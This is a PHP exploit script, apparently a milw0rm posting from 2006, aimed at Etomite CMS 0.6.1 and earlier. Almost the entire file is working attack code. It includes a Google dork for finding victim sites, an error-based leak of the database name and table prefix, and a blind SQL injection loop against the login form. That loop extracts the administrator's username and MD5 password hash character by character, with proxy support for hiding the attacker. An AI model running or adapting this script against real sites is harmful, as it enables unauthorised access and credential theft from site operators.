#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;Etomite CMS &lt;= 0.6.1 (all patches applied) &#039;username&#039; SQL injection / admin credentials disclosure\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n&quot;;
echo &quot;google dork: \&quot;Content managed by the Etomite Content Management System\&quot;\r\n\r\n&quot;;

/*
works with magic_quotes_gpc=Off
*/

if ($argc&lt;3) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path OPTIONS\r\n&quot;;
echo &quot;host:      target server (ip/hostname)\r\n&quot;;
echo &quot;path:      path to etomite\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -T[prefix]:  specify a table prefix (default: etomite_)\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /etomite/ \r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost / -P1.1.1.1:80\r\n&quot;;
die;
}
/*
software site: http://www.etomite.org/

explaination:

goto http://[target]/[path_to_etomite]/manager/index.php

and, if magic_quotes_gpc=Off you have sql injection in &#039;username&#039; argument

you *could* bypass login check with a well crafted &#039;UNION SELECT&#039; but the
following &#039;REPLACE INTO&#039; query will fail.
Through the error message you can disclose database name and table prefix
that will be useful to go on with a new attack, asking true/false questions
to the database to dislose username/md5 hash pair...

*/
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
	}
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

function is_hash($hash)
{
 if (ereg(&quot;^[a-f0-9]{32}&quot;,trim($hash))) {return true;}
 else {return false;}
}

function my_encode($my_string)
{
  $encoded=&quot;CHAR(&quot;;
  for ($k=0; $k&lt;=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=&quot;)&quot;;}
    else {$encoded.=&quot;,&quot;;}
  }
  return $encoded;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy=&quot;&quot;;
for ($i=3; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-T&quot;)
{
  $refix=str_replace(&quot;-T&quot;,&quot;&quot;,$argv[$i]);
}
}

if (($path[0]&lt;&gt;&#039;/&#039;) or ($path[strlen($path)-1]&lt;&gt;&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

$prefix=&quot;etomite_&quot;; //default
$dbname=&quot;etomite&quot;; //default

// ** disclose dbname &amp; table prefix **
$sql=&quot;99999999$&#039;/**/UNION/**/SELECT/**/0,&#039;sutnzu&#039;,MD5(&#039;suntzu&#039;),0,0,0,0,0,0,0,0,0,0,0,0,0,0/*&quot;;
echo &quot;sql -&gt; &quot;.$sql.&quot;\r\n&quot;;
$sql=urlencode($sql);
$data=&quot;rememberme=1&quot;;
$data.=&quot;&amp;location=&quot;;
$data.=&quot;&amp;username=&quot;.$sql;
$data.=&quot;&amp;password=suntzu&quot;;
$data.=&quot;&amp;thing=&quot;;
$data.=&quot;&amp;submit=Login&quot;;
$data.=&quot;&amp;licenseOK=1&quot;;
$packet =&quot;POST &quot;.$p.&quot;manager/processors/login.processor.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
$temp=explode(&quot;Set-Cookie: &quot;,$html);
$cookie=&quot;&quot;;
for ($i=1; $i&lt;=count($temp)-1; $i++)
{
$temp2=explode(&quot; &quot;,$temp[$i]);
$cookie.=&quot; &quot;.$temp2[0];
}
$packet =&quot;GET &quot;.$p.&quot;manager/index.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;REPLACE INTO&quot;))
{
$temp=explode(&quot;REPLACE INTO `&quot;,$html);
$temp2=explode(&quot;active_users&quot;,$temp[1]);
$temp=explode(&quot;`.&quot;,$temp2[0]);
$dbname=$temp[0];
$prefix=$temp[1];
}
else
{
echo &quot;using default values for dbame &amp; prefix...\r\n&quot;;
}
echo &quot;database name -&gt; &quot;.$dbname.&quot;\r\n&quot;;
echo &quot;table prefix  -&gt; &quot;.$prefix.&quot;\r\n&quot;;
sleep(2);
//** end **

//** launch exploit **
$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
//print_r(array_values($md5s));
$password=&quot;&quot;;
$j=1;
while (!strstr($password,chr(0)))
{
for ($i=0; $i&lt;=255; $i++)
{
if (in_array($i,$md5s))
{
$sql=&quot;99999999$&#039;/**/UNION/**/SELECT/**/0,&#039;suntzu&#039;,(IF((ASCII(SUBSTRING(password,&quot;.$j.&quot;,1))=&quot;.$i.&quot;),MD5(&#039;suntzu&#039;),-1)),0,0,0,0,0,0,0,0,0,0,0,0,0,0/**/FROM/**/`&quot;.$dbname.&quot;`.&quot;.$prefix.&quot;manager_users,`&quot;.$dbname.&quot;`.&quot;.$prefix.&quot;user_attributes/*&quot;;
echo &quot;sql -&gt; &quot;.$sql.&quot;\r\n&quot;;
$sql=urlencode($sql);
$data=&quot;rememberme=1&quot;;
$data.=&quot;&amp;location=&quot;;
$data.=&quot;&amp;username=&quot;.$sql;
$data.=&quot;&amp;password=suntzu&quot;;
$data.=&quot;&amp;thing=&quot;;
$data.=&quot;&amp;submit=Login&quot;;
$data.=&quot;&amp;licenseOK=1&quot;;
$packet =&quot;POST &quot;.$p.&quot;manager/processors/login.processor.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (!strstr($html,&quot;Incorrect username or password entered&quot;)) {$password.=chr($i);echo &quot;password -&gt; &quot;.$password.&quot;[???]\r\n&quot;;sleep(2);break;}
}
if ($i==255) {die(&quot;Exploit failed...&quot;);}
}
$j++;
}

$admin=&quot;&quot;;
$j=1;
while (!strstr($admin,chr(0)))
{
for ($i=0; $i&lt;=255; $i++)
{
$sql=&quot;99999999$&#039;/**/UNION/**/SELECT/**/0,&#039;suntzoi&#039;,(IF((ASCII(SUBSTRING(username,&quot;.$j.&quot;,1))=&quot;.$i.&quot;),MD5(&#039;suntzoi&#039;),-1)),0,0,0,0,0,0,0,0,0,0,0,0,0,0/**/FROM/**/`&quot;.$dbname.&quot;`.&quot;.$prefix.&quot;manager_users,`&quot;.$dbname.&quot;`.&quot;.$prefix.&quot;user_attributes/*&quot;;
echo &quot;sql -&gt; &quot;.$sql.&quot;\r\n&quot;;
$sql=urlencode($sql);
$data=&quot;rememberme=1&quot;;
$data.=&quot;&amp;location=&quot;;
$data.=&quot;&amp;username=&quot;.$sql;
$data.=&quot;&amp;password=suntzoi&quot;;
$data.=&quot;&amp;thing=&quot;;
$data.=&quot;&amp;submit=Login&quot;;
$data.=&quot;&amp;licenseOK=1&quot;;
$packet =&quot;POST &quot;.$p.&quot;manager/processors/login.processor.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (!strstr($html,&quot;Incorrect username or password entered&quot;)) {$admin.=chr($i);echo &quot;admin -&gt; &quot;.$admin.&quot;[???]\r\n&quot;;sleep(2);break;}
if ($i==255) {die(&quot;Exploit failed...&quot;);}
}
$j++;
}
echo &quot;-----------------------------------------------------------------------\r\n&quot;;
echo &quot;admin          -&gt; &quot;.$admin.&quot;\r\n&quot;;
echo &quot;password (md5) -&gt; &quot;.$password.&quot;\r\n&quot;;
echo &quot;-----------------------------------------------------------------------\r\n&quot;;
?&gt;

# milw0rm.com [2006-07-25]

